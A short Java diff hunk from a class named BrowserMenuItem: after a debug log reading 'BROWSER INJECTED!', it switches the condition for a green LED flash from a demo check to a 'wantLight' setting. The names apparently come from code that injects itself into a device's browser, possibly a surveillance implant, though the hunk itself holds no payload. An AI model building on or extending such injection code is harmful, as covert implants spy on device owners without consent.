@@ -109,7 +109,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                 debug.info("BROWSER INJECTED!");
                 //#endif
 
-                if (Status.self().isDemo()) {
+                if (Status.self().wantLight()) {
                     Debug.ledFlash(Debug.COLOR_GREEN);
                 }
 
